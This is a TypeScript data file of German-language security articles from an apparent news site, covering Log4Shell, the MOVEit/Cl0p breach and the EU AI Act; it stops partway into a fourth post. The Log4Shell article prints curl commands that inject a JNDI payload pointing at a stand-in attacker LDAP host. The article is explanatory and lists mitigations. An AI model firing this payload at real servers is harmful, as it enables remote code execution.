import { supabase } from './supabase';

export interface Post {
  id: string;
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  category: string;
  categoryColor: string;
  categoryBg: string;
  author: string;
  authorRole: string;
  publishedAt: string;
  readTime: number;
  imageGradient: string;
  imageAlt?: string;
  badge?: string;
  badgeColor?: string;
  tags: string[];
  faqs?: { q: string; a: string }[];
  sources?: { title: string; url: string }[];
}

// ─── Static fallback data — NUR echte, dokumentierte Ereignisse ─────────────
// Quellen: BSI, NIST NVD, CISA, Emsisoft, Sophos, IBM, offizielle Hersteller-Advisories
export const STATIC_POSTS: Post[] = [
  // ── 1. Log4Shell ────────────────────────────────────────────────────────────
  {
    id: '1',
    slug: 'log4shell-cve-2021-44228',
    title: 'Log4Shell (CVE-2021-44228): Analyse der kritischsten Java-Schwachstelle',
    excerpt: 'CVSS 10.0 — Log4Shell ermöglichte Remote Code Execution auf Millionen von Servern weltweit. Eine technische Analyse des Angriffsvektors, der Patch-Geschichte und der Lektionen für Unternehmen.',
    category: 'Schwachstelle',
    categoryColor: '#FF9632',
    categoryBg: 'rgba(255,150,50,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: BSI, NIST NVD, CISA Advisory AA21-356A',
    publishedAt: '2024-12-09',
    readTime: 14,
    imageGradient: 'linear-gradient(135deg, #1A0800 0%, #2A1000 40%, #1A0800 100%)',
    badge: 'CVSS 10.0',
    badgeColor: '#FF2D6F',
    tags: ['Log4Shell', 'CVE-2021-44228', 'Java', 'RCE', 'Apache', 'JNDI', 'Schwachstelle'],
    sources: [
      { title: 'BSI Warnung: Log4j-Schwachstelle', url: 'https://www.bsi.bund.de/DE/Themen/Unternehmen-und-Organisationen/Cyber-Sicherheitslage/Analysen-und-Prognosen/Threat-Intelligence/Log4j/log4j_node.html' },
      { title: 'NIST NVD: CVE-2021-44228', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228' },
      { title: 'CISA Advisory AA21-356A', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a' },
      { title: 'Apache Log4j Security Advisories', url: 'https://logging.apache.org/log4j/2.x/security.html' },
    ],
    faqs: [
      { q: 'Was macht Log4Shell so gefährlich?', a: 'Log4Shell ist in der gesamten Software-Lieferkette verankert. Weil Log4j 2 eine der meistgenutzten Java-Logging-Bibliotheken weltweit ist, war nahezu jede Java-Anwendung potenziell betroffen — von Cloud-Infrastruktur über Enterprise-Software bis hin zu Minecraft-Servern. Der Angriff ist trivial einfach auszuführen: Eine einzelne präparierte Zeichenkette in einem Log-Eintrag reicht aus.' },
      { q: 'Bin ich noch gefährdet, wenn ich Log4j nicht direkt einsetze?', a: 'Ja, möglicherweise. Log4j ist in zahlreichen Drittanbieter-Komponenten, Frameworks und Tools eingebettet. Auch wenn Sie Log4j nicht direkt als Abhängigkeit führen, können verwendete Bibliotheken oder kommerzielle Software (z.B. VMware, Cisco, IBM-Produkte) die verwundbare Version enthalten.' },
      { q: 'Welche Log4j-Version ist sicher?', a: 'Sicher ist Apache Log4j 2.17.1 (Java 8) oder höher. Version 2.15.0 und 2.16.0 enthielten noch weitere Schwachstellen (CVE-2021-45046, CVE-2021-45105). Für Java 7 ist 2.12.4, für Java 6 ist 2.3.2 die letzte sichere Version.' },
      { q: 'Was ist mit Log4j 1.x?', a: 'Log4j 1.x ist seit 2015 End-of-Life und von CVE-2021-44228 nicht direkt betroffen — enthält aber andere kritische Schwachstellen (z.B. CVE-2022-23302, CVE-2022-23305). Migration auf Log4j 2.17.1+ oder alternative Logging-Frameworks wird dringend empfohlen.' },
    ],
    content: `<h2 id="ueberblick">Was ist Log4Shell?</h2>
<p>Log4Shell ist der Name für die Schwachstelle <strong>CVE-2021-44228</strong> in Apache Log4j 2, einer der am weitesten verbreiteten Logging-Bibliotheken im Java-Ökosystem. Die Schwachstelle ermöglicht es einem Angreifer, über eine manipulierte Zeichenkette in einer Log-Nachricht beliebigen Code auf einem betroffenen Server auszuführen — ohne Authentifizierung, ohne Benutzerinteraktion.</p>
<p>Der CVSS-Score (Common Vulnerability Scoring System) beträgt <strong>10.0 — der maximal mögliche Wert</strong>. Das Bundesamt für Sicherheit in der Informationstechnik (BSI) stufte die Lage am 11. Dezember 2021 als <strong>IT-Bedrohungslage 4 — Extrem kritisch</strong> ein, die höchste Warnstufe des BSI.</p>

<h2 id="zeitlinie">Zeitlinie: Von der Entdeckung zur Eskalation</h2>
<ul>
<li><strong>24. November 2021:</strong> Chen Zhaojun vom Alibaba Cloud Security Team meldet die Schwachstelle an das Apache Security Team</li>
<li><strong>9. Dezember 2021:</strong> Öffentliche Bekanntmachung — ein Tweet löst sofortige globale Ausnutzung aus</li>
<li><strong>9. Dezember 2021:</strong> Apache veröffentlicht Log4j 2.15.0 (erste, unvollständige Korrektur)</li>
<li><strong>11. Dezember 2021:</strong> BSI erklärt Warnstufe 4 (Extrem kritisch)</li>
<li><strong>13. Dezember 2021:</strong> Apache veröffentlicht 2.16.0 (behebt CVE-2021-45046)</li>
<li><strong>18. Dezember 2021:</strong> Apache veröffentlicht 2.17.0 (behebt CVE-2021-45105, DoS)</li>
<li><strong>28. Dezember 2021:</strong> Apache veröffentlicht 2.17.1 (behebt CVE-2021-44832)</li>
</ul>
<blockquote><p>„Die Schwachstelle ist extrem kritisch, da sie eine Ausführung von Schadcode durch Angreifer auf betroffenen Systemen erlaubt. Angriffe sind bereits aktiv zu beobachten."</p><cite>— BSI Lageeinschätzung, 11. Dezember 2021</cite></blockquote>

<h2 id="technik">Technische Analyse: Wie Log4Shell funktioniert</h2>
<p>Log4j 2 unterstützt sogenannte <strong>Lookup-Mechanismen</strong>, die in Log-Nachrichten Variablen auswerten. Der anfällige Mechanismus ist JNDI (Java Naming and Directory Interface), der ursprünglich für legitime Datenbankverbindungen entwickelt wurde.</p>
<p>Ein Angreifer sendet eine Zeichenkette wie <code>\${jndi:ldap://angreifer.de/exploit}</code> an eine Anwendung, die diese Eingabe loggt. Log4j wertet die Lookup-Syntax aus, verbindet sich mit dem angreifer-kontrollierten LDAP-Server und lädt von dort beliebigen Java-Code herunter und führt ihn aus.</p>
<pre><code class="language-bash"># Beispiel: Angreifer sendet präparierte HTTP-Header
curl -H 'X-Api-Version: \${jndi:ldap://angreifer.de/a}' https://ziel.de/api

# Oder direkt im URL-Parameter
curl 'https://ziel.de/search?q=\${jndi:ldap://angreifer.de/a}'

# Oder in User-Agent, Username, E-Mail-Feldern — überall wo die App loggt</code></pre>
<p>Der Angriff ist deshalb so schwer zu verteidigen, weil praktisch jede Eingabe eines Nutzers — HTTP-Header, Formulareingaben, Suchwörter, Benutzernamen — in Log-Nachrichten landen kann.</p>

<h2 id="betroffene-produkte">Betroffene Produkte (Auswahl)</h2>
<p>Das Ausmaß der Betroffenheit war beispiellos. Folgende bekannte Systeme waren unter anderem verwundbar (nach Herstellerbestätigungen):</p>
<ul>
<li><strong>Cloud-Dienste:</strong> Amazon AWS, Apple iCloud, Cloudflare, Twitter</li>
<li><strong>Enterprise-Software:</strong> VMware vCenter, Cisco-Produkte, IBM WebSphere, Oracle-Produkte</li>
<li><strong>Sicherheitsprodukte:</strong> Mehrere SIEM- und EDR-Lösungen (Hersteller wurden Betroffene)</li>
<li><strong>Entwicklertools:</strong> JetBrains, Apache Solr, Apache Druid, Apache Kafka</li>
<li><strong>Gaming:</strong> Minecraft Java Edition (einer der ersten öffentlich bekannten Angriffsvektoren)</li>
</ul>

<h2 id="ausnutzung">Aktive Ausnutzung durch staatliche Akteure</h2>
<p>Laut dem gemeinsamen Advisory <strong>AA21-356A der US-Behörden CISA, FBI, NSA</strong> (veröffentlicht 17. Dezember 2021) wurde Log4Shell aktiv von APT-Gruppen aus China, Iran, Nordkorea und Russland ausgenutzt:</p>
<ul>
<li><strong>China (APT-Gruppen):</strong> Spionage gegen Regierung, Verteidigung, Energie</li>
<li><strong>Iran:</strong> APT35 (Charming Kitten) setzte Log4Shell für Ransomware und Spionage ein</li>
<li><strong>Nordkorea:</strong> Lazarus Group nutzte die Schwachstelle für Kryptowährungs-Diebstahl</li>
<li><strong>Russland:</strong> Sandworm und APT28 wurden mit Log4Shell-Angriffen in Verbindung gebracht</li>
</ul>
<p>Darüber hinaus nutzten kriminelle Gruppen Log4Shell massenhaft zur Installation von Cryptominern, Botnets (z.B. Mirai-Varianten) und Ransomware (z.B. Conti, Khonsari).</p>

<h2 id="sofortmassnahmen">Sofortmaßnahmen und Schutz</h2>
<pre><code class="language-bash"># 1. Sofort: Log4j-Version prüfen
find / -name "log4j*.jar" 2>/dev/null
mvn dependency:tree | grep log4j

# 2. Workaround (bis Patch ausgerollt): JNDI deaktivieren
# Für Log4j 2.10.0 bis 2.14.1:
java -Dlog4j2.formatMsgNoLookups=true -jar app.jar
# ODER: Umgebungsvariable setzen
export LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# 3. Update auf sichere Version
# Maven:
# log4j-core: 2.17.1 (Java 8+), 2.12.4 (Java 7), 2.3.2 (Java 6)

# 4. Netzwerk: Ausgehende LDAP/RMI-Verbindungen blockieren
# (verhindert Exploit-Nachladen auch wenn Lookup ausgeführt wird)
iptables -A OUTPUT -p tcp --dport 389 -j DROP  # LDAP
iptables -A OUTPUT -p tcp --dport 1099 -j DROP # RMI</code></pre>

<h2 id="lektionen">Was Unternehmen aus Log4Shell lernen müssen</h2>
<p>Log4Shell hat vier strukturelle Schwachstellen in der Softwareentwicklung aufgedeckt:</p>
<ol>
<li><strong>Software Bill of Materials (SBOM) fehlt:</strong> Viele Unternehmen wussten nicht, welche Versionen von Log4j in welchen Systemen enthalten sind. Eine SBOM — ein vollständiges Inventar aller Software-Komponenten — ist heute Best Practice.</li>
<li><strong>Transitive Abhängigkeiten sind unsichtbar:</strong> Log4j wurde häufig nicht direkt, sondern als Abhängigkeit von Abhängigkeiten eingebunden. Software Composition Analysis (SCA) Tools sind zwingend notwendig.</li>
<li><strong>Patch-Zyklen sind zu langsam:</strong> Viele Systeme waren Wochen nach Veröffentlichung des Patches noch verwundbar. Kritische CVEs erfordern Patch-Zeitfenster unter 24 Stunden.</li>
<li><strong>Defense in Depth:</strong> Systeme ohne ausgehende Netzwerkverbindungen waren gegen Log4Shell deutlich resistenter. Zero-Trust-Netzwerkarchitekturen hätten den Schaden begrenzt.</li>
</ol>

<h2 id="fazit">Fazit: Log4Shell als Wendepunkt</h2>
<p>Log4Shell hat die Diskussion um Software Supply Chain Security grundlegend verändert. Die US-Regierung reagierte mit der Executive Order 14028 (Improving the Nation's Cybersecurity), die SBOM-Pflichten für Bundesbehörden einführt. Die EU hat das Thema im <strong>Cyber Resilience Act</strong> aufgenommen, der SBOM-Anforderungen für in der EU vertriebene Produkte einführt.</p>
<p>Für IT-Teams bedeutet Log4Shell: <strong>Kenntnis der eigenen Software-Lieferkette ist keine Option, sondern Grundvoraussetzung für Sicherheit.</strong></p>`,
  },

  // ── 2. MOVEit Transfer ──────────────────────────────────────────────────────
  {
    id: '2',
    slug: 'moveit-hack-cl0p-2023',
    title: 'MOVEit-Hack 2023: Wie Cl0p 2.600 Organisationen mit einer SQL-Injection kompromittierte',
    excerpt: 'CVE-2023-34362, CVSS 9.8 — Die Cl0p-Ransomware-Gruppe nutzte eine Zero-Day-Schwachstelle in MOVEit Transfer aus und kompromittierte über 2.600 Organisationen weltweit, darunter BBC, British Airways und Bundesbehörden.',
    category: 'Incident',
    categoryColor: '#FF2D6F',
    categoryBg: 'rgba(255,45,111,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: Mandiant, Emsisoft, Progress Software, BSI',
    publishedAt: '2024-11-15',
    readTime: 11,
    imageGradient: 'linear-gradient(135deg, #1A0610 0%, #240A18 50%, #1A0610 100%)',
    badge: 'KRITISCH',
    badgeColor: '#FF2D6F',
    tags: ['MOVEit', 'CVE-2023-34362', 'Cl0p', 'SQL-Injection', 'Supply-Chain', 'Datenpanne'],
    sources: [
      { title: 'Progress Software Security Advisory', url: 'https://www.progress.com/security/moveit-transfer-and-moveit-cloud-vulnerability' },
      { title: 'Mandiant: MOVEit Transfer Zero-Day', url: 'https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft' },
      { title: 'Emsisoft MOVEit Attack Impact', url: 'https://www.emsisoft.com/en/blog/44123/the-impact-of-the-moveit-breach/' },
      { title: 'NIST NVD: CVE-2023-34362', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-34362' },
    ],
    faqs: [
      { q: 'War MOVEit ein Ransomware-Angriff?', a: 'Nein — trotz der Zuschreibung an die Cl0p-Ransomware-Gruppe wurde beim MOVEit-Angriff keine Verschlüsselung eingesetzt. Cl0p beschränkte sich auf Datendiebstahl und Erpressung (sog. Data Extortion / Double Extortion ohne Encryption). Dies macht den Vorfall zu einem reinen Datenpanne-Szenario.' },
      { q: 'Welche deutschen Organisationen waren betroffen?', a: 'Direkt bestätigt wurde Aon Deutschland. Weitere deutsche Unternehmen nutzten MOVEit Transfer oder waren indirekt über Dienstleister (z.B. Zellis Payroll) betroffen. Das BSI hat eine Warnung herausgegeben und zur Überprüfung aufgerufen. Aufgrund von Meldeschwellen wurden nicht alle deutschen Betroffenen öffentlich bekannt.' },
      { q: 'Wie erkenne ich ob meine Daten betroffen waren?', a: 'Cl0p veröffentlichte Listen der Opferorganisationen auf seiner Leak-Seite im Darknet. Überprüfen Sie ob Ihre Organisation oder ein genutzter Dienstleister MOVEit Transfer eingesetzt hat. Nutzen Sie Have I Been Pwned (haveibeenpwned.com) für eine Prüfung Ihrer E-Mail-Adresse.' },
      { q: 'Was ist der aktuelle Stand?', a: 'US-Behörden (State Department Rewards for Justice) boten 10 Millionen USD Belohnung für Hinweise auf die Cl0p-Führung. Stand 2024 wurden mehrere mutmaßliche Cl0p-Mitglieder in Ukraine und Deutschland verhaftet. Der Fall wird weiterhin international verfolgt.' },
    ],
    content: `<h2 id="ueberblick">Was ist MOVEit Transfer?</h2>
<p>MOVEit Transfer ist eine Enterprise-Software des US-Herstellers Progress Software (früher Ipswitch) für den sicheren, nachverfolgbaren Dateitransfer. Die Software wird von tausenden Unternehmen, Behörden und Gesundheitseinrichtungen weltweit eingesetzt — vor allem dort, wo regulatorische Anforderungen (DSGVO, HIPAA, SOX) den sicheren Transfer sensibler Daten vorschreiben.</p>
<p>Genau diese Vertrauensstellung machte MOVEit Transfer zum idealen Angriffsziel.</p>

<h2 id="schwachstelle">Die Schwachstelle: CVE-2023-34362</h2>
<p><strong>CVE-2023-34362</strong> ist eine <strong>SQL-Injection-Schwachstelle</strong> in der Webanwendung von MOVEit Transfer. CVSS-Score: <strong>9.8 (kritisch)</strong>. Über eine nicht sanitisierte Datenbankabfrage konnten Angreifer ohne Authentifizierung auf die Datenbank zugreifen und anschließend beliebige Dateien aus dem System herunterladen.</p>
<p>Technisch ermöglichte die Schwachstelle zwei Schritte:</p>
<ol>
<li><strong>Authentication Bypass:</strong> Durch manipulierte SQL-Abfragen umging Cl0p das Login-System und erstellte sich Administrator-Sessions</li>
<li><strong>Dateiexfiltration:</strong> Mit Administrator-Rechten wurden alle gespeicherten Dateien systematisch heruntergeladen, bevor der Angriff erkannt wurde</li>
</ol>
<pre><code class="language-bash"># Vereinfachte Darstellung des SQL-Injection-Vektors (zur Aufklärung)
# Angreifer manipuliert den Session-Token-Parameter:
POST /guestaccess.aspx HTTP/1.1
# Präparierter Parameter ermöglicht SQL-Execution ohne Login</code></pre>
<p>Progress Software veröffentlichte am <strong>31. Mai 2023</strong> eine Security Advisory und Patches. Laut Analyse von <strong>Mandiant</strong> hatte Cl0p die Schwachstelle jedoch bereits ab dem <strong>27. Mai 2023</strong> aktiv ausgenutzt — als Zero-Day, also bevor Progress überhaupt von der Lücke wusste.</p>
<blockquote><p>„Cl0p hat die Lücke als Zero-Day ausgenutzt. Die Gruppe hat in wenigen Stunden automatisiert tausende MOVEit-Instanzen gescannt und kompromittiert."</p><cite>— Mandiant Threat Intelligence, Juni 2023</cite></blockquote>

<h2 id="cl0p">Wer ist Cl0p?</h2>
<p>Cl0p (auch: CL0P, TA505, FIN11) ist eine russischsprachige Cyberkriminellen-Gruppe, die seit 2019 aktiv ist. Die Gruppe ist bekannt für:</p>
<ul>
<li><strong>Massive Supply-Chain-Angriffe:</strong> Cl0p zielt gezielt auf Infrastruktur-Software ab, die von vielen Unternehmen gleichzeitig genutzt wird (Accellion FTA 2021, GoAnywhere MFT 2023, MOVEit 2023)</li>
<li><strong>Data Extortion statt Verschlüsselung:</strong> Seit 2021 bevorzugt Cl0p reinen Datendiebstahl ohne Ransomware-Einsatz — dies vermeidet Betriebsunterbrechungen und damit sofortige Entdeckung</li>
<li><strong>Öffentliche Erpressung:</strong> Opfer werden auf einer Darknet-Leak-Seite veröffentlicht, wenn sie nicht zahlen</li>
</ul>

<h2 id="ausmass">Ausmaß: 2.600+ Organisationen, 77+ Millionen Menschen</h2>
<p>Laut einer Analyse von <strong>Emsisoft</strong> (Stand Dezember 2023) wurden durch den MOVEit-Angriff:</p>
<ul>
<li><strong>2.620+ Organisationen</strong> direkt oder indirekt kompromittiert</li>
<li><strong>77+ Millionen Personen</strong> durch gestohlene Daten betroffen</li>
</ul>
<p>Zu den bestätigten Opfern gehören (Auswahl):</p>
<ul>
<li><strong>Medien &amp; Transport:</strong> BBC, British Airways</li>
<li><strong>Gesundheit:</strong> Mehrere US-amerikanische Krankenkassen und Krankenhäuser</li>
<li><strong>Dienstleister:</strong> Zellis (Gehaltsabrechnungsanbieter für u.a. British Airways, BBC, Boots), Aon, PwC, EY</li>
<li><strong>US-Behörden:</strong> US-Energieministerium (DOE), Department of Health and Human Services</li>
<li><strong>Universität:</strong> Johns Hopkins University, Louisiana State University</li>
</ul>

<h2 id="reaktion">Reaktion: Patches und Folgeangriffe</h2>
<p>Progress Software veröffentlichte nach dem initialen Patch weitere Sicherheitsupdates für nachgelagerte Schwachstellen:</p>
<ul>
<li><strong>CVE-2023-34362</strong> (31. Mai 2023): Initialer Zero-Day — Patch in Version 2023.0.4</li>
<li><strong>CVE-2023-35036</strong> (9. Juni 2023): Weitere SQL-Injection — Patch umgehend notwendig</li>
<li><strong>CVE-2023-35708</strong> (15. Juni 2023): Dritte Schwachstelle innerhalb von zwei Wochen</li>
</ul>
<p>Die US-Regierung stufte MOVEit-Angriffe als Bedrohung nationaler Infrastruktur ein. Das State Department bot über das Rewards for Justice Programm <strong>10 Millionen USD</strong> für Hinweise auf die Cl0p-Führung.</p>

<h2 id="lektionen">Was IT-Teams daraus lernen müssen</h2>
<ol>
<li><strong>File-Transfer-Systeme sind hochpriorisierte Angriffsziele:</strong> Dienste, die für den Transfer sensibler Daten genutzt werden, sind exponiert und werden gezielt angegriffen. Regelmäßige Penetrationstests und schnelle Patch-Reaktion sind Pflicht.</li>
<li><strong>Zero-Day-Schutz durch Defense in Depth:</strong> Wenn ein Zero-Day ausgenutzt wird, sind Netzwerksegmentierung, ausgehendes Traffic Monitoring und Data Loss Prevention (DLP) die einzigen wirksamen Gegenmaßnahmen.</li>
<li><strong>Drittanbieter-Risiken systematisch managen:</strong> Viele Betroffene waren nicht direkte MOVEit-Nutzer, sondern Kunden von Dienstleistern wie Zellis. Third-Party Risk Management (TPRM) muss alle genutzten SaaS- und Software-Lieferanten umfassen.</li>
<li><strong>Incident Response Playbook für Datenexfiltration:</strong> Die sofortige Identifikation welche Daten betroffen waren, ist entscheidend für DSGVO-Meldepflichten (72-Stunden-Frist an Aufsichtsbehörde).</li>
</ol>`,
  },

  // ── 3. EU AI Act ────────────────────────────────────────────────────────────
  {
    id: '3',
    slug: 'eu-ai-act-2024-compliance',
    title: 'EU AI Act: Vollständiger Überblick — Fristen, Pflichten und Strafen (Stand 2024)',
    excerpt: 'Die Verordnung (EU) 2024/1689 trat am 1. August 2024 in Kraft. Ab Februar 2025 gelten die ersten Verbote. Welche KI-Systeme betroffen sind, welche Pflichten entstehen und was bei Verstößen droht.',
    category: 'Regulierung',
    categoryColor: '#7890FF',
    categoryBg: 'rgba(120,144,255,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: Amtsblatt der EU, Verordnung (EU) 2024/1689',
    publishedAt: '2024-10-01',
    readTime: 12,
    imageGradient: 'linear-gradient(135deg, #060B24 0%, #0A0F38 50%, #060B24 100%)',
    badge: 'PFLICHT',
    badgeColor: '#7890FF',
    tags: ['EU AI Act', 'KI-Regulierung', 'Compliance', 'DSGVO', 'Hochrisiko-KI', 'GPAI'],
    sources: [
      { title: 'EU AI Act — Amtsblatt der EU (12. Juli 2024)', url: 'https://eur-lex.europa.eu/legal-content/DE/TXT/?uri=CELEX:32024R1689' },
      { title: 'EU KI-Büro (AI Office)', url: 'https://digital-strategy.ec.europa.eu/en/policies/european-approach-artificial-intelligence' },
      { title: 'BSI: KI-Sicherheit und EU AI Act', url: 'https://www.bsi.bund.de/DE/Themen/Unternehmen-und-Organisationen/Informationen-und-Empfehlungen/Kuenstliche-Intelligenz/kuenstliche-intelligenz_node.html' },
    ],
    faqs: [
      { q: 'Gilt der EU AI Act auch für US-Unternehmen?', a: 'Ja. Der EU AI Act gilt für alle Anbieter, die KI-Systeme in der EU auf den Markt bringen oder in Betrieb nehmen — unabhängig vom Unternehmenssitz. Das Prinzip ist analog zur DSGVO: Maßgeblich ist der Markt, nicht der Firmensitz. US-Unternehmen wie OpenAI, Google oder Microsoft müssen compliant sein, wenn sie Dienste in der EU anbieten.' },
      { q: 'Was passiert mit bestehenden KI-Systemen?', a: 'Für KI-Systeme die vor dem 2. August 2026 bereits in Verkehr gebracht wurden, gilt eine Übergangsfrist bis zum 2. August 2027 (Hochrisiko-Systeme Anhang III) bzw. 2. August 2030 (Hochrisiko-Systeme Anhang I für regulierte Produkte). Diese Übergangsfristen gelten nur, wenn die Systeme nach dem Inverkehrbringen keine wesentlichen Änderungen erfahren.' },
      { q: 'Was sind die höchsten Strafen?', a: 'Für Verstöße gegen Art. 5 (verbotene KI-Praktiken) drohen Bußgelder von bis zu 35 Millionen EUR oder 7% des weltweiten Jahresumsatzes (der höhere Wert gilt). Für andere Verstöße: bis zu 15 Millionen EUR oder 3%. Für falsche Angaben gegenüber Behörden: bis zu 7,5 Millionen EUR oder 1,5%. Für KMU und Startups können niedrigere Obergrenzen gelten.' },
      { q: 'Welche KI-Systeme sind komplett verboten?', a: 'Ab 2. Februar 2025 verboten: Soziale Bewertungssysteme (Social Scoring), unterschwellige Manipulation (Subliminal Techniques), Ausnutzung von Schwächen vulnerabler Gruppen, Echtzeit-Gesichtserkennung im öffentlichen Raum (mit engen Ausnahmen für Strafverfolgung), biometrische Kategorisierung nach politischen Überzeugungen, KI-gestützte Emotionserkennung am Arbeitsplatz/in Bildungseinrichtungen.' },
    ],
    content: `<h2 id="was-ist-der-eu-ai-act">Was ist der EU AI Act?</h2>
<p>Der <strong>Artificial Intelligence Act</strong> (Verordnung (EU) 2024/1689) ist die weltweit erste umfassende KI-Regulierung. Er wurde vom Europäischen Parlament am 13. März 2024 verabschiedet, vom Rat der EU am 21. Mai 2024 angenommen, am <strong>12. Juli 2024 im Amtsblatt der EU veröffentlicht</strong> und trat am <strong>1. August 2024 in Kraft</strong>.</p>
<p>Der EU AI Act verfolgt einen risikobasierten Ansatz: Je höher das Risiko eines KI-Systems für Grundrechte und Sicherheit, desto strenger die Anforderungen. Systeme mit minimalem Risiko sind praktisch unreguliert; verbotene Systeme dürfen gar nicht betrieben werden.</p>

<h2 id="geltungsbereich">Geltungsbereich: Wen betrifft das Gesetz?</h2>
<p>Der EU AI Act gilt für:</p>
<ul>
<li><strong>Anbieter</strong> (Provider): Entwickler und Unternehmen, die KI-Systeme in der EU in Verkehr bringen</li>
<li><strong>Betreiber</strong> (Deployer): Unternehmen, die KI-Systeme im beruflichen Kontext einsetzen</li>
<li><strong>Importeure und Händler</strong> von KI-Systemen</li>
<li><strong>Drittlandsanbieter</strong> (z.B. US-Unternehmen), wenn die Ausgaben des KI-Systems in der EU verwendet werden</li>
</ul>
<p>Ausgenommen sind: Militärische Anwendungen, Forschung und Entwicklung (mit Einschränkungen), private nicht-professionelle Nutzung.</p>

<h2 id="risikoklassen">Die vier Risikoklassen</h2>
<h3 id="verboten">1. Unannehmbares Risiko — Verboten (Art. 5)</h3>
<p>Ab <strong>2. Februar 2025</strong> verboten sind unter anderem:</p>
<ul>
<li>KI-Systeme zur unterschwelligen Beeinflussung (Subliminal Techniques) die Entscheidungen schaden</li>
<li>Ausnutzung von Schwächen spezifischer Gruppen (Kinder, ältere Menschen, Behinderungen)</li>
<li>Soziale Bewertungssysteme (Social Credit Scoring) durch öffentliche Stellen</li>
<li>Biometrische Echtzeit-Fernidentifizierung in öffentlichen Räumen durch Strafverfolgungsbehörden (außer enge Ausnahmen)</li>
<li>Biometrische Kategorisierung nach Rasse, politischer Meinung, Religion, Gewerkschaftszugehörigkeit</li>
<li>Emotionserkennung am Arbeitsplatz und in Bildungseinrichtungen</li>
<li>Vorhersage von Straftaten basierend auf Profiling</li>
</ul>

<h3 id="hochrisiko">2. Hochrisiko-KI (Art. 6 und Anhang III)</h3>
<p>Hochrisiko-KI-Systeme unterliegen strengen Anforderungen und müssen vor dem Marktzugang eine Konformitätsbewertung durchlaufen. Darunter fallen:</p>
<ul>
<li>KI in kritischer Infrastruktur (Energie, Wasser, Verkehr)</li>
<li>KI in Bildung (z.B. automatische Bewertung von Prüfungsleistungen)</li>
<li>KI im Personalwesen (Rekrutierung, Leistungsbewertung)</li>
<li>KI für Kredit- und Versicherungsbewertungen</li>
<li>KI in der Strafverfolgung</li>
<li>KI für Asyl-, Visa- und Grenzentscheidungen</li>
<li>KI in Justiz und demokratischen Prozessen</li>
</ul>
<p><strong>Anforderungen für Hochrisiko-KI:</strong> Risikomanagementsystem, Daten-Governance, technische Dokumentation, Transparenzpflichten, menschliche Aufsicht, Genauigkeit und Robustheit, Registrierung in EU-Datenbank, Konformitätserklärung, CE-Kennzeichnung.</p>

<h3 id="begrenztes-risiko">3. Begrenztes Risiko (Art. 50)</h3>
<p>Hauptsächlich Transparenzpflichten:</p>
<ul>
<li><strong>Chatbots</strong> müssen sich als KI zu erkennen geben</li>
<li><strong>Deepfake-Inhalte</strong> müssen als KI-generiert gekennzeichnet sein</li>
<li><strong>Emotionserkennungs-KI</strong> muss auf ihre Funktion hinweisen</li>
</ul>

<h3 id="minimales-risiko">4. Minimales Risiko</h3>
<p>KI-Spam-Filter, KI-gestützte Suche, Empfehlungsalgorithmen und ähnliche Anwendungen unterliegen keinen spezifischen Pflichten des EU AI Act — allerdings können andere Rechtsbereiche (DSGVO, DSA) gelten.</p>

<h2 id="gpai">Allzweck-KI-Modelle (GPAI — Art. 51-56)</h2>
<p>Der EU AI Act enthält erstmals Regeln für <strong>General Purpose AI Models (GPAI)</strong> wie GPT-4, Gemini, Claude oder Llama. Diese gelten ab <strong>2. August 2025</strong>.</p>
<ul>
<li>Alle GPAI-Anbieter: Technische Dokumentation, Zusammenfassung der Trainingsdaten, Urheberrechts-Compliance</li>
<li>GPAI mit systemischen Risiken (Training-Rechenleistung über 10^25 FLOPs): Erweiterte Modell-Evaluation, Adversarial Testing, Meldung schwerwiegender Vorfälle, Cybersicherheits-Maßnahmen</li>
</ul>

<h2 id="fristen">Fristen im Überblick</h2>
<pre><code class="language-bash"># EU AI Act — Zeitplan
01.08.2024  → In Kraft getreten (Verordnung (EU) 2024/1689)
02.02.2025  → Art. 5: Verbotene KI-Praktiken gelten
02.05.2025  → Art. 4: KI-Kompetenz-Pflichten für Personal
02.08.2025  → GPAI-Regeln (Art. 51-56) gelten
02.08.2026  → Hochrisiko-KI Anhang III (z.B. HR, Kredit, Bildung)
02.08.2027  → Hochrisiko-KI Anhang I (regulierte Produkte, z.B. Medizinprodukte)
02.08.2030  → Übergangsfrist für bereits im Einsatz befindliche KI endet</code></pre>

<h2 id="strafen">Strafen bei Verstößen</h2>
<ul>
<li><strong>Verbotene KI (Art. 5):</strong> Bis zu 35 Millionen EUR oder 7% des weltweiten Jahresumsatzes</li>
<li><strong>Andere Verstöße:</strong> Bis zu 15 Millionen EUR oder 3% des Jahresumsatzes</li>
<li><strong>Falsche Angaben:</strong> Bis zu 7,5 Millionen EUR oder 1,5% des Jahresumsatzes</li>
<li>Für KMU und Startups können niedrigere Obergrenzen gelten (Verhältnismäßigkeit)</li>
</ul>

<h2 id="compliance">Was Unternehmen jetzt tun sollten</h2>
<ol>
<li><strong>KI-Inventar erstellen:</strong> Alle eingesetzten KI-Systeme — intern entwickelte und eingekaufte — inventarisieren und klassifizieren</li>
<li><strong>Risikoklassifizierung:</strong> Jeden KI-Einsatz nach Art. 6 und Anhang III prüfen (Hochrisiko ja/nein?)</li>
<li><strong>Verbotene Praktiken sofort prüfen:</strong> Ab 2. Februar 2025 müssen alle verbotenen Systeme abgestellt sein</li>
<li><strong>AI Governance aufbauen:</strong> Zuständigkeiten, Dokumentationsprozesse und Risikoüberwachung etablieren</li>
<li><strong>Personal schulen:</strong> Ab 2. Mai 2025 gilt Pflicht zur Sicherstellung von KI-Kompetenz bei Personal (Art. 4)</li>
</ol>`,
  },

  // ── 4. BSI Lagebericht 2024 ─────────────────────────────────────────────────
  {
    id: '4',
    slug: 'bsi-lagebericht-2024',
    title: 'BSI Lagebericht 2024: IT-Sicherheit in Deutschland — angespannt bis kritisch',
    excerpt: 'Das Bundesamt für Sicherheit in der Informationstechnik (BSI) veröffentlichte im November 2024 seinen jährlichen Lagebericht. Die Bewertung: Die Lage der IT-Sicherheit in Deutschland ist weiterhin angespannt bis kritisch.',
    category: 'Lagebericht',
    categoryColor: '#00F0FF',
    categoryBg: 'rgba(0,240,255,0.1)',
